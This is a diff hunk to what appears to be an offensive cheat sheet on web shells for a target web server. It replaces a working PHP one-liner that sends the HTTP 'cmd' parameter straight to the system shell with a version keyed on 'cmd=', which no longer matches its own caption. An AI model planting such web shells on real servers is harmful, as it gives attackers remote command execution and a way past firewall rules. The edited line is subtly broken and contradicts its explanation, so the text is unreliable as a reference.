@@ -110,7 +110,7 @@ Runs on the target web server. Communicates over HTTP — bypasses firewall rule
 **PHP**
 > Takes the `cmd` parameter from the HTTP request and passes it directly to the system shell.
 ```php
-<?php system($_REQUEST["cmd"]); ?>
+<?php system($_REQUEST["cmd="]); ?>
 ```
 
 **JSP**
